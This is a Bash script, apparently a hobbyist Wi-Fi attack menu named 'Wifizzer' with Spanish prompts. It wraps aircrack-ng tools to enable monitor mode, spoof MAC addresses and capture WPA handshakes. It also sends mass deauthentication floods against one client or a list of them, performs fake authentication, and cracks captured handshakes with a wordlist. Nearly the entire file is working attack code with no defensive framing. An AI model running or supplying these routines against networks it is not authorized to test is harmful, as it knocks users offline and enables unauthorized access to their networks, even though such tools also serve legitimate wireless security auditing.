#!/bin/bash

function start(){
#--- COLORS --- #
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
# ------------ #

status_connection=`arp -a | grep -i -c 'gateway'`
cap='handshake/network'
test -d 'handshake' || mkdir 'handshake'
clear ; echo -e "${GREEN}`figlet Wifizzer`"

function status(){
if [[ $status_connection == 1 ]];then
echo -e "${WHITE} Status de conexion: ${GREEN}Conectado"
else
echo -e "${WHITE} Status de conexion: ${RED}Desconectado"
fi
}

status

function return0(){
echo -e -n "\n ${GREEN}[+] ${WHITE}Presione ${GREEN}[ENTER]${WHITE} Para continuar... "
read enter
start
}

function interfaz(){
interfaces=($(ifconfig | awk '/: /{print $1}' | sed 's/://' | grep -v 'lo'))
echo ""
for i in "${!interfaces[@]}"; do
  echo -e " ${GREEN}[$((i+1))]${WHITE} ${interfaces[i]}"
done
echo -n -e "\n Elige una interfaz (número): "
read seleccion
if [[ "$seleccion" =~ ^[0-9]+$ ]] && [ "$seleccion" -gt 0 ] && [ "$seleccion" -le "${#interfaces[@]}" ]; then
  interfaz_elegida="${interfaces[$((seleccion-1))]}"
  echo "$interfaz_elegida">.if0
else
  echo "Selección inválida!"
fi
start
}

interfaz0=`cat .if0 2>/dev/null`
function monitor_mode(){
ifconfig $interfaz0 down
airmon-ng check kill >/dev/null 2>/dev/null
iwconfig $interfaz0 mode monitor
}

function mode_managed(){
ifconfig $interfaz0 down
iwconfig $interfaz0 mode managed
ifconfig $interfaz0 up
systemctl restart NetworkManager
systemctl enable NetworkManager
}

function bssidMac(){
echo -e -n "${YELLOW} [+] ${WHITE}BSSID =>${YELLOW} "
read BSSID
echo -e -n "${YELLOW} [+] ${WHITE}MAC =>${YELLOW} "
read MAC
echo -e "$WHITE"
}

function desauth(){
bssidMac
aireplay-ng --deauth 1000000 -a $BSSID -c $MAC $interfaz0 &>/dev/null&
}

desauth_all() {
name_wordlist="$1"
cat $name_wordlist | while read z; do
set -- $z
BSSID="$1"
MAC="$2"
aireplay-ng --deauth 1000000 -a $BSSID -c $MAC $interfaz0 &>/dev/null&
echo -e " ${YELLOW}[+]${WHITE} Atacando MAC => ${YELLOW}${MAC}"
done
echo -e "$WHITE"
ps -u | grep "\-\-deauth"
}

hotspot() {
echo -e -n "Nombre del hotspot => "
read name_hotspot
echo -e -n "Clave del hotspot => "
read password
nmcli device wifi hotspot ifname $interfaz0 ssid $name_hotspot password $password
}

networkNET() {
echo -e -n "${GREEN} [+] ${GREEN}BSSID =>${WHITE} "
read BSSID
echo -e -n "${GREEN} [+] CANAL => ${WHITE}"
read CH
echo ""
airodump-ng --bssid $BSSID --channel $CH --write $cap $interfaz0
}

KillDAuth(){
echo -e -n "\n ${YELLOW}PID => ${WHITE}"
read PID
kill -9 $PID
echo -e "\n$WHITE PROCESO CERRADO EXITOSAMENTE"
}

fakeAuth(){
aireplay-ng --fakeauth 0 -a $BSSID -h $MAC $interfaz0
}

test -f '.if0' && echo -e " ${WHITE}Interfaz: ${GREEN}${interfaz0}" || interfaz
mode=`iwconfig $interfaz0 | grep -i -c 'managed'` 2>/dev/null

function if_mode(){
if [[ $mode == 1 ]];then
echo -e " ${WHITE}Modo :${GREEN} Managed"
else
echo -e " ${WHITE}Modo :${GREEN} Monitor"
fi
}

function showDAuth(){
ps u | grep -i 'deauth' | awk '{print "\033[1;33mPID:\033[0m " $2 " \033[1;33mMAC: \033[0m" $15}'
}


if_mode

echo -e "
 $GREEN[0]$WHITE Activar el modo monitor
 $GREEN[1]$WHITE Cambiar interfaz de red
 $GREEN[2]$WHITE Cambiar direccion MAC
 $GREEN[3]$WHITE Escanear redes cercanas
 $GREEN[4]$WHITE Monitorear red especifica con BSSID
 $GREEN[5]$WHITE Desconectar Dispositivo(s) conectado a una red
 $GREEN[6]$WHITE Activar Hotspot o (anclaje wifi)
 $GREEN[7]$WHITE Ataque de fuerza bruta a red wifi
 $GREEN[8]$WHITE Falsa autenticacion en la red wifi
 $GREEN[9]$WHITE Ver procesos de desautenticacion

 $RED[A]$WHITE Reactivar mi interfaz de red y gestor de red
 $RED[X]$WHITE Salir del script ahora
"

echo -e -n " -----> "
read opc

if [[ $opc == 0 ]];then
monitor_mode
elif [[ $opc == 1 ]];then
if [[ $mode == 1 ]];then
interfaz
else
echo -e -n "$GREEN [+]$WHITE Estas en modo monitor no puedes cambiar interfaz de red "
read enter
fi
elif [[ $opc == 2 ]];then
function showMac(){
MAC=`ifconfig $interfaz0 | grep 'ether' | awk '{print $2}'`
echo -e " ${WHITE}Mac Actual => ${GREEN}$MAC"
}
showMac
echo -e -n "${WHITE} Nueva direccion MAC : $GREEN"
read newMac
ifconfig $interfaz0 down
ifconfig $interfaz0 hw ether $newMac
ifconfig $interfaz0 up
showMac ; echo -e -n "\nPresione [ENTER] Para Continuar... " ; read enter
elif [[ $opc == 3 ]];then
airodump-ng $interfaz0
elif [[ $opc == 4 ]];then
networkNET
elif [[ $opc == 5 ]];then
echo -e "${YELLOW} [1] ${WHITE}Desautenticar un solo dispositivo
${YELLOW} [2] ${WHITE}Desautenticar varios dispositivos (wordlist)
"
echo -e -n "${WHITE} Selecciona tu opcion => ${YELLOW}"
read opcd
if [[ $opcd == 1 ]];then
desauth
elif [[ $opcd == 2 ]];then
echo -e -n " ${YELLOW}[+]${WHITE} Nombre del archivo con la informacion => ${YELLOW}"
read name
desauth_all "$name"
fi
elif [[ $opc == 6 ]];then
hotspot
elif [[ $opc == 7 ]];then
echo -e -n "
 ${YELLOW}[1]${WHITE} Crackear clave del wifi con cap + diccionario
 Seleccionar opcion => "
read x
if [[ $x == 1 ]];then
echo -e -n "\n${YELLOW} [+]${WHITE} Archivo .CAP => "
read cap
echo -e -n "${YELLOW} [+]${WHITE} Diccionario => "
read wordlist
aircrack-ng $cap -w $wordlist
fi
elif [[ $opc == 8 ]];then
bssidMac
fakeAuth

elif [[ $opc == 9 ]];then
showDAuth
KillDAuth
elif [[ $opc == 'A' ]] || [[ $opc == 'a' ]] ;then
mode_managed
iwconfig $interfaz0
echo -e -n " ${GREEN}[+]${WHITE} [ENTER] Para continuar... "
read enter
elif [[ $opc == 'X' ]] || [[ $opc == 'x' ]] ;then
mode_managed
echo "Hasta la Proxima ..."
sleep 2
exit
fi


### RETORNAR ###
return0
}
start
